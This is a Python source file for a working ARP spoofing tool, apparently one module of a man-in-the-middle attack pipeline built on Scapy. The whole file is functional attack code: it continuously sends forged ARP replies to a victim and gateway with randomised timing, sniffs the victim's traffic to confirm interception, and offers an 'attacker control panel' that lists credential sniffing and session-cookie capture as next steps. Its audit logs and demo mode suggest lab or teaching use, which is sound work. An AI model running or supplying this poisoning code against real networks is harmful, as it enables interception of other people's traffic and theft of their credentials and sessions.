"""
src/attacks/arp_spoofing.py

ARP spoofing module with two operating profiles:

1) Full / demo mode (mitm_pipeline arp):
   - Evidence-first logs (explains the deception)
   - Verification phase (prove MITM with observed victim traffic)
   - Interactive ARP control panel
   - Periodic poisoning logs + audit snapshots

2) Prerequisite mode (mitm_pipeline session/dns/ssl):
   - Quiet operation (no ARP control panel)
   - No verification phase spam
   - No periodic poisoning explanation logs
   - Still performs continuous poisoning + restore
"""

import os
import time
import json
import random
import threading
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import Optional, Dict

from scapy.all import ARP, send, sniff, IP, TCP, UDP, ICMP, conf, get_if_hwaddr

from src.core.network import get_mac_for_ip

class Colors:
    RESET = "\033[0m"       # Reset color to default
    BOLD = "\033[1m"        # Bold text
    UNDERLINE = "\033[4m"   # Underlined text
    RED = "\033[31m"        # Red text
    GREEN = "\033[32m"      # Green text
    YELLOW = "\033[33m"     # Yellow text
    BLUE = "\033[34m"       # Blue text
    MAGENTA = "\033[35m"    # Magenta text
    CYAN = "\033[36m"       # Cyan text
    WHITE = "\033[37m"      # White text


def log_with_color(msg: str, color: str) -> None:
    """Print messages with colors."""
    print(f"{color}{msg}{Colors.RESET}")

# Audit Helpers
def _ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _ensure_dir(path: str) -> None:
    os.makedirs(path, exist_ok=True)


def _append_line(path: str, line: str) -> None:
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def _append_json(path: str, obj: dict) -> None:
    _append_line(path, json.dumps(obj, ensure_ascii=False))


# Data Model
@dataclass
class ArpStats:
    started_at: str
    iface: str
    victim_ip: str
    gateway_ip: str
    attacker_mac: str
    victim_mac: str
    gateway_mac: str

    poison_packets_sent: int = 0
    restore_packets_sent: int = 0

    # verification
    verified_mitm: bool = False
    verified_at: Optional[str] = None
    verification_reason: Optional[str] = None

    # traffic statistics
    seen_packets_total: int = 0
    seen_ip_packets: int = 0
    seen_tcp: int = 0
    seen_udp: int = 0
    seen_icmp: int = 0
    seen_dns: int = 0
    seen_http: int = 0
    seen_bytes: int = 0

    # talkers
    top_src: Optional[str] = None
    top_dst: Optional[str] = None


# Main Class
class ARPSpoofer(threading.Thread):
    """
    Performs persistent ARP cache poisoning to become MITM.

    Deception:
      - Victim is told:  gateway_ip is-at attacker_mac
      - Gateway is told: victim_ip  is-at attacker_mac

    Result:
      Victim <-> Attacker <-> Gateway
    """

    def __init__(
        self,
        target_ip: str,
        gateway_ip: str,
        interface: str = "enp0s3",
        *,
        audit_dir: str = ".",
        dependents: Optional[list[str]] = None,

        # timing
        poison_interval_s: float = 2.0,
        poison_jitter_s: float = 0.6,
        periodic_log_every: int = 5,

        # advanced features
        verify_timeout_s: float = 30.0,
        start_control_panel: bool = True,
        prerequisite_mode: bool = False,
        minimal_audit: bool = True,
    ):
        super().__init__()
        self.daemon = True

        self.interface = interface or "enp0s3"
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

        self.poison_interval_s = max(0.6, poison_interval_s)
        self.poison_jitter_s = max(0.0, poison_jitter_s)
        self.periodic_log_every = max(1, periodic_log_every)

        self.verify_timeout_s = max(3.0, verify_timeout_s)
        self.start_control_panel = start_control_panel
        self.prerequisite_mode = prerequisite_mode
        self.minimal_audit = minimal_audit

        # In prerequisite mode, force-disable noisy features
        if self.prerequisite_mode:
            self.start_control_panel = False
            self.verify_timeout_s = 0.0

        self.dependents = dependents or []
        self._stop_event = threading.Event()
        self._lock = threading.Lock()

        # Audit paths
        self.audit_dir = audit_dir
        _ensure_dir(self.audit_dir)
        self.audit_log_path = os.path.join(self.audit_dir, "arp_audit.log")
        self.audit_jsonl_path = os.path.join(self.audit_dir, "arp_audit.jsonl")

        # Resolve MAC addresses
        self.attacker_mac = self._get_attacker_mac()

        self.target_mac = get_mac_for_ip(self.target_ip, self.interface)
        self.gateway_mac = get_mac_for_ip(self.gateway_ip, self.interface)
        if not self.target_mac or not self.gateway_mac:
            raise RuntimeError("Failed to resolve MAC addresses. Check connectivity / interface.")

        # Stats + talkers
        self.stats = ArpStats(
            started_at=_ts(),
            iface=self.interface,
            victim_ip=self.target_ip,
            gateway_ip=self.gateway_ip,
            attacker_mac=self.attacker_mac,
            victim_mac=self.target_mac,
            gateway_mac=self.gateway_mac,
        )
        self._cycle = 0
        self._talker_src: Dict[str, int] = {}
        self._talker_dst: Dict[str, int] = {}

        # Verification + control panel
        self._verified_event = threading.Event()
        self._control_panel_started = False

        # Initial logs
        if not self.prerequisite_mode:
            self._log(
                f"[INFO] ARP Spoofing configured on {self.interface}\n"
                f"       Victim  : {self.target_ip}  (MAC {self.target_mac})\n"
                f"       Gateway : {self.gateway_ip} (MAC {self.gateway_mac})\n"
                f"       Attacker: (MAC {self.attacker_mac})\n"
            )
            if self.dependents:
                self._log(f"[INFO] ARP is a dependency for: {', '.join(self.dependents)}")

        if self.minimal_audit:
            self._audit_info("ARP_SPOOF_INIT", {
                "profile": "prerequisite" if self.prerequisite_mode else "demo",
                "iface": self.interface,
                "victim_ip": self.target_ip,
                "gateway_ip": self.gateway_ip,
                "attacker_mac": self.attacker_mac,
                "victim_mac": self.target_mac,
                "gateway_mac": self.gateway_mac,
                "dependents": self.dependents,
            })

    # Logging
    def _log(self, msg: str, color: str = Colors.RESET) -> None:
        now = datetime.now().strftime("%H:%M:%S")
        print(f"{color}[ARP] [{now}] {msg}{Colors.RESET}")

    def _audit_info(self, event: str, data: dict) -> None:
        if not self.minimal_audit:
            return
        _append_line(self.audit_log_path, f"[{_ts()}] {event} {json.dumps(data, ensure_ascii=False)}")
        _append_json(self.audit_jsonl_path, {"ts": _ts(), "event": event, "data": data})

    def _audit_stats_snapshot(self, reason: str) -> None:
        if not self.minimal_audit:
            return
        snap = asdict(self.stats)
        snap["reason"] = reason
        self._audit_info("ARP_STATS_SNAPSHOT", snap)

    # MAC Helpers
    def _get_attacker_mac(self) -> str:
        try:
            return get_if_hwaddr(self.interface)
        except Exception:
            try:
                return conf.iface.mac
            except Exception:
                return "UNKNOWN"

    # ARP Packet Crafting
    def _spoof_reply(self, *, pdst: str, hwdst: str, psrc: str) -> ARP:
        return ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)

    def _restore_reply(self, *, pdst: str, hwdst: str, psrc: str, hwsrc: str) -> ARP:
        return ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc, hwsrc=hwsrc)

    # Poisioning loop
    def _send_poison_pair(self) -> None:
        victim_spoof = self._spoof_reply(
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.gateway_ip
        )

        gateway_spoof = self._spoof_reply(
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.target_ip
        )

        send(victim_spoof, iface=self.interface, verbose=False)
        send(gateway_spoof, iface=self.interface, verbose=False)

        self.stats.poison_packets_sent += 2

    def _poison_interval(self) -> float:
        if self.poison_jitter_s <= 0:
            return self.poison_interval_s
        return max(0.4, self.poison_interval_s + random.uniform(-self.poison_jitter_s, self.poison_jitter_s))

    # Verification for demo mode
    def _traffic_sniff_callback(self, pkt):
        if self._stop_event.is_set():
            return

        self.stats.seen_packets_total += 1

        try:
            self.stats.seen_bytes += len(bytes(pkt))
        except Exception:
            pass

        if pkt.haslayer(IP):
            self.stats.seen_ip_packets += 1
            src = pkt[IP].src
            dst = pkt[IP].dst

            self._talker_src[src] = self._talker_src.get(src, 0) + 1
            self._talker_dst[dst] = self._talker_dst.get(dst, 0) + 1

            if pkt.haslayer(TCP):
                self.stats.seen_tcp += 1
                try:
                    if pkt[TCP].sport == 80 or pkt[TCP].dport == 80:
                        self.stats.seen_http += 1
                except Exception:
                    pass

            if pkt.haslayer(UDP):
                self.stats.seen_udp += 1
                try:
                    if pkt[UDP].sport == 53 or pkt[UDP].dport == 53:
                        self.stats.seen_dns += 1
                except Exception:
                    pass

            if pkt.haslayer(ICMP):
                self.stats.seen_icmp += 1

            # Verification condition:
            # If we see IP traffic from victim on this interface => interception proven.
            if src == self.target_ip and not self.stats.verified_mitm:
                self.stats.verified_mitm = True
                self.stats.verified_at = _ts()
                self.stats.verification_reason = f"Observed victim traffic on {self.interface}: {src} -> {dst}"
                self._verified_event.set()

                self._log("[PASS] MITM VERIFIED: victim traffic intercepted on attacker interface.", Colors.GREEN)
                self._log(f"       Evidence: {self.stats.verification_reason}")
                self._audit_info("MITM_VERIFIED", {
                    "verified_at": self.stats.verified_at,
                    "iface": self.interface,
                    "victim_ip": self.target_ip,
                    "example_flow": f"{src} -> {dst}",
                })

    def _verify_mitm_phase(self) -> None:
        # Disabled in prerequisite mode
        if self.prerequisite_mode or self.verify_timeout_s <= 0:
            return

        self._log("[INFO] Verification phase: sniffing for victim traffic to prove MITM...")
        self._audit_info("VERIFICATION_STARTED", {"timeout_s": self.verify_timeout_s})

        end_time = time.time() + self.verify_timeout_s
        while time.time() < end_time and not self._stop_event.is_set() and not self._verified_event.is_set():
            sniff(iface=self.interface, prn=self._traffic_sniff_callback, store=0, timeout=1.0)

        if self.stats.verified_mitm:
            self._log("[INFO] Verification phase complete: MITM proven.")
        else:
            self._log("[WARN] Verification phase ended: MITM not proven yet (victim is idle).")
            self._log("       Generate traffic from victim (ping/curl/browser) and re-check via control panel.")
            self._audit_info("VERIFICATION_NOT_PROVEN", {"hint": "Victim idle. Generate traffic."})

        self._audit_stats_snapshot("after_verification")

        if self.start_control_panel and self.stats.verified_mitm and not self._control_panel_started:
            self._control_panel_started = True
            threading.Thread(target=self._control_panel, daemon=True).start()

    # Control Panel for demo mode
    def _control_panel(self):
        if self.prerequisite_mode:
            return

        self._log("[INFO] Attacker Control Panel ready (ARP MITM).")
        self._audit_info("CONTROL_PANEL_STARTED", {})

        while not self._stop_event.is_set():
            try:
                print("\n" + "=" * 84)
                log_with_color("ATTACKER CONTROL PANEL — ARP SPOOFING / MITM (Evidence + Impact)", Colors.YELLOW)
                print("=" * 84)
                print(f"Interface : {self.interface}")
                print(f"Victim    : {self.target_ip}  (real MAC {self.target_mac})")
                print(f"Gateway   : {self.gateway_ip} (real MAC {self.gateway_mac})")
                print(f"Attacker  : (MAC {self.attacker_mac})")
                print("-" * 84)
                log_with_color("Impact (what attacker can do now):", Colors.GREEN)
                print("  - Passively sniff victim traffic (HTTP/DNS/credentials if unencrypted).")
                print("  - Tamper/redirect traffic if combined with DNS spoofing / SSL stripping.")
                print("  - Capture session cookies on insecure HTTP apps (session hijacking module).")
                print("-" * 84)
                print("1) Show stats + verification state")
                print("2) Re-run short verification sniff (5s)")
                print("3) Show top talkers")
                print("4) Write audit snapshot now")
                print("5) Quit panel (ARP continues)")
                choice = input("\nSelect [1-5]: ").strip()

                if choice == "1":
                    self._update_top_talkers()
                    print("\n--- STATS ---")
                    for k, v in asdict(self.stats).items():
                        print(f"{k:>20}: {v}")
                    print(f"\nAudit log: {os.path.abspath(self.audit_log_path)}")

                elif choice == "2":
                    self._log("[INFO] Manual re-verification (5s sniff).")
                    self._audit_info("MANUAL_REVERIFY", {"seconds": 5})
                    end = time.time() + 5
                    while time.time() < end and not self._stop_event.is_set():
                        sniff(iface=self.interface, prn=self._traffic_sniff_callback, store=0, timeout=1.0)
                    self._log("[INFO] Manual re-verification done.")
                    self._audit_stats_snapshot("manual_reverify")

                elif choice == "3":
                    self._update_top_talkers()
                    print("\n--- TOP TALKERS ---")
                    print(f"Top src: {self.stats.top_src}")
                    print(f"Top dst: {self.stats.top_dst}")

                elif choice == "4":
                    self._update_top_talkers()
                    self._audit_stats_snapshot("manual_snapshot")
                    print("[OK] Snapshot written.")

                elif choice == "5":
                    self._log("[INFO] Control Panel closed by attacker.")
                    self._audit_info("CONTROL_PANEL_EXITED", {})
                    return

                else:
                    print("Invalid choice.")

            except (KeyboardInterrupt, EOFError):
                self._log("[INFO] Control Panel interrupted; closing.")
                self._audit_info("CONTROL_PANEL_INTERRUPTED", {})
                return
            except Exception as e:
                self._log(f"[ERROR] Control Panel error: {e}")
                self._audit_info("CONTROL_PANEL_ERROR", {"error": str(e)})

    def _update_top_talkers(self):
        if self._talker_src:
            self.stats.top_src = max(self._talker_src.items(), key=lambda kv: kv[1])[0]
        if self._talker_dst:
            self.stats.top_dst = max(self._talker_dst.items(), key=lambda kv: kv[1])[0]

    # Thread run + stop
    def run(self):
        if not self.prerequisite_mode:
            self._log("=" * 72)
            self._log("ARP SPOOFING (MITM) — Evidence-first, audited, interactive", Colors.RED)
            self._log(f" Interface : {self.interface}")
            self._log(f" Victim    : {self.target_ip}  (real MAC {self.target_mac})")
            self._log(f" Gateway   : {self.gateway_ip} (real MAC {self.gateway_mac})")
            self._log(f" Attacker  : (MAC {self.attacker_mac})")
            self._log(" Deception : Victim thinks gateway IP -> attacker MAC; gateway thinks victim IP -> attacker MAC")
            self._log("=" * 72)

        self._audit_info("ARP_POISONING_STARTED", {
            "profile": "prerequisite" if self.prerequisite_mode else "demo",
            "iface": self.interface,
            "victim_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "poison_interval_s": self.poison_interval_s,
            "poison_jitter_s": self.poison_jitter_s,
        })

        # Verification thread only in demo mode
        if not self.prerequisite_mode and self.verify_timeout_s > 0:
            threading.Thread(target=self._verify_mitm_phase, daemon=True).start()

        while not self._stop_event.is_set():
            try:
                self._cycle += 1
                self._send_poison_pair()

                # Periodic explanation logs only in demo mode
                if (not self.prerequisite_mode) and (self._cycle % self.periodic_log_every == 0):
                    self._log(
                        "Periodic poisoning: sent forged ARP replies:\n"
                        f"  (1) Victim  {self.target_ip} told: {self.gateway_ip} is-at {self.attacker_mac}\n"
                        f"  (2) Gateway {self.gateway_ip} told: {self.target_ip} is-at {self.attacker_mac}\n"
                        "Result: both route through attacker (MITM), assuming IP forwarding is enabled."
                    )
                    self._audit_info("ARP_POISONING_PERIODIC", {
                        "cycle": self._cycle,
                        "poison_packets_sent": self.stats.poison_packets_sent,
                    })
                    self._update_top_talkers()
                    self._audit_stats_snapshot("periodic")

            except Exception as e:
                if not self.prerequisite_mode:
                    self._log(f"[ERROR] ARP spoofing loop error: {e}")
                self._audit_info("ARP_LOOP_ERROR", {"error": str(e)})

                # best-effort MAC re-resolution (quiet in prerequisite mode)
                try:
                    new_v = get_mac_for_ip(self.target_ip, self.interface)
                    new_g = get_mac_for_ip(self.gateway_ip, self.interface)
                    if new_v and new_g:
                        with self._lock:
                            self.target_mac = new_v
                            self.gateway_mac = new_g
                            self.stats.victim_mac = new_v
                            self.stats.gateway_mac = new_g
                        self._audit_info("MAC_RERESOLVED", {"victim_mac": new_v, "gateway_mac": new_g})
                except Exception as e2:
                    self._audit_info("MAC_RERESOLVE_FAILED", {"error": str(e2)})

            time.sleep(self._poison_interval())

        self._audit_info("ARP_THREAD_EXIT", {})

    def stop(self):
        # In prerequisite mode, keep stop output quiet.
        if not self.prerequisite_mode:
            self._log("[INFO] Stopping ARP Spoofer… (restoring ARP tables)")
        self._audit_info("ARP_STOP_REQUESTED", {"profile": "prerequisite" if self.prerequisite_mode else "demo"})
        self._stop_event.set()
        self._restore()
        self._update_top_talkers()
        self._audit_stats_snapshot("stop")

    def _restore(self):
        victim_restore = self._restore_reply(
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac
        )

        gateway_restore = self._restore_reply(
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac
        )

        self._audit_info("ARP_RESTORE_STARTED", {})
        for _ in range(5):
            try:
                send(victim_restore, iface=self.interface, verbose=False)
                send(gateway_restore, iface=self.interface, verbose=False)
                self.stats.restore_packets_sent += 2
                time.sleep(0.4)
            except Exception as e:
                self._audit_info("ARP_RESTORE_ERROR", {"error": str(e)})

        self._audit_info("ARP_RESTORE_DONE", {"restore_packets_sent": self.stats.restore_packets_sent})


def start_arp_spoof(
    target_ip: str,
    gateway_ip: str,
    interface: str = "enp0s3",
    *,
    audit_dir: str = ".",
    dependents: Optional[list[str]] = None,
    prerequisite_mode: bool = False,
):
    """
    Entry point used by the MITM pipeline.
    """
    try:
        spoofer = ARPSpoofer(
            target_ip,
            gateway_ip,
            interface,
            audit_dir=audit_dir,
            dependents=dependents,
            prerequisite_mode=prerequisite_mode,
        )
        spoofer.start()
        return spoofer
    except Exception as e:
        print(f"[CRITICAL ERROR] Failed to start ARPSpoofer: {e}")
        return None


if __name__ == "__main__":
    TARGET_IP = "10.0.0.10"
    GATEWAY_IP = "10.0.0.1"
    INTERFACE = "enp0s3"

    spoofer = ARPSpoofer(TARGET_IP, GATEWAY_IP, INTERFACE)
    spoofer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        spoofer.stop()
        print("[INFO] Stopped ARP spoofing.")
